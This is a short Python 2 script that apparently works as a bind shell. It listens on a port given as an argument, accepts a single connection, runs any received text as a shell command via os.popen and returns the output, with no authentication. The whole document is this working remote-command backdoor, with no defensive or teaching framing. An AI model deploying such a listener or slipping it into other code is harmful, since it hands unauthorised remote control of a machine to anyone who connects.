import socket
import os
import subprocess
import sys
import threading

HOST = ''
PORT = int(sys.argv[1])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print 'Connectado', addr

data = conn.recv(20480)
data = os.popen(data).read()
conn.sendall(data)
conn.close()

